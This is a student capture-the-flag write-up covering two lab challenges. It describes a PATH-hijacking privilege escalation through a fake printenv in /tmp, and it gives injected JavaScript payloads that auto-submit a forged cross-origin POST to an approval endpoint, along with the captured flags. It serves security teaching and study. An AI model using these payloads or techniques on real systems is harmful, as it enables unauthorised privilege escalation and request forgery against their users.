### British Punctuality

After analyzing the directories and files, we noticed some things.

Upon entry, there's a reader program, a main.c file which is the source code of this reader program and a shell script. <br>

This reader program attempts to read the /flags/flag.txt but, since we don't have permissions to read it, it can never execute and read the flag. <br>

The shell script checks for the existence of a /tmp/env file, changes the environment variables based on it, deletes the file and then executes a printenv shell program that prints all the environment variables to the console and then executes the reader program.

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058437178964836412/image.png">

With this in mind, we went ahead and checked the /tmp directory, in which we realized we had permissions to create files, so we devised a strategy. <br>

We created an env file that changes the PATH environment variable to point to the /tmp directory.

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058449240319348857/image.png">

This will make it so whenever we try to run any system built-in commands, the system will try to fetch the location of that command going down the directories in the PATH variable. <br>
Since the /tmp folder is the first in line, if there's a printenv executable there, the system will call that one, instead of the "real" one. 

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058445037995827350/image.png">

And because the script calling this new printenv command has root access and therefore can read the /flag.txt file, if we were to put a cat flag.txt command in the new printenv command, we should be able to see the flag(flag{08276c3eaa5aff543e02f1d5719aac94}
) in the last_logs file.<br>

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058449597451743312/image.png">


### Final Format

### Echo

### Apply For Flag II

This CTF is very similar to Week 10 Challenge 1, with a small yet annoying difference: the admin page and the justification page are hosted on the same website but on different ports, which counts as different origins. <br>

Firstly, we tried to do the same as we did on that challenge, sending a POST request using Ajax to the action that submits the approval for the flag.<br>

```html
<script type="text/javascript">
        window.onload = function () {
                var Ajax=null;
                var sendurl="http://ctf-fsi.fe.up.pt:5005/request/64d2f32ef60ef1df5b6f58701f0d47fbe59c6584/approve";
                Ajax=new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.send();
        }
</script>
```

This did not work because it triggered a CORS error:

`Access to XMLHttpRequest at 'http://ctf-fsi.fe.up.pt:5005/request/64d2f32ef60ef1df5b6f58701f0d47fbe59c6584/approve' from origin 'http://ctf-fsi.fe.up.pt:5004' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.`

Now that we knew what we need to defeat, we started to look for ways to go around that. <br>

One way that we researched was the use of iframes to bypass SOP, but this turned out to be a dead end and a major headache. <br>

Until we finally arrived at a solution, which came to our mind because of the Laravel framework we're using on the LBAW course. <br>

Generally, if a form is submitted on a website, it won't trigger any SOP error because it's the own website submitting the request, and not someone/something external to it. <br>

With this in mind, we devised a script that would inject a form onto the DOM and then submit it automatically. <br>

```html
<script type="text/javascript">

    document.body.onload = function () {

        var form = document.createElement("form");
        form.method = "POST";
        form.action = "http://ctf-fsi.fe.up.pt:5005/request/b3131dce877a8b7198566429b90379958476bc9b/approve";
        form.name = "form";
        form.role = "form";

        document.body.appendChild(form);

        document.form.submit();

    }
</script>
```

The problem with this approach is that it will automatically redirect us to the action URL, which means we need to find a way to stop that. <br>

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058467818246508575/image.png">

After a couple tries trying to use javascript to stop the webpage from redirecting, which didn't work, we decided the best way to achieve the intended result was to just stop javascript execution in the browser with an extension and navigating to the URL that tells us if our request was approved. <br>

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058468658529177661/image.png">

This worked perfectly, as when we loaded the page it wouldn't redirect us anymore, because our script tag was being disabled, allowing us to retrieve the flag (flag{24e4abf36593c5f93b13d0f5449c1258}).

<img src="https://cdn.discordapp.com/attachments/1049764414255018045/1058468097662660718/image.png">

There's only one improvement we could make, which is to make it so the script works autonomously, retrieving the request id from the URL, so we don't have to change our code every time we wanted to exploit this website.

```html
<script type="text/javascript">

    document.body.onload = function () {

        var form = document.createElement("form");
        form.method = "POST";
        form.action = window.location.href.substring(0,27) + "5" + window.location.href.substring(28) + "/approve";
        form.name = "form";
        form.role = "form";

        document.body.appendChild(form);

        document.form.submit();

    }
</script>
```

Unfortunatelly, despite the action URL being built correctly, for some reason our request is never approved. <br>
Since we already have the flag, we didn't give it much second thought, but decided to document this either way.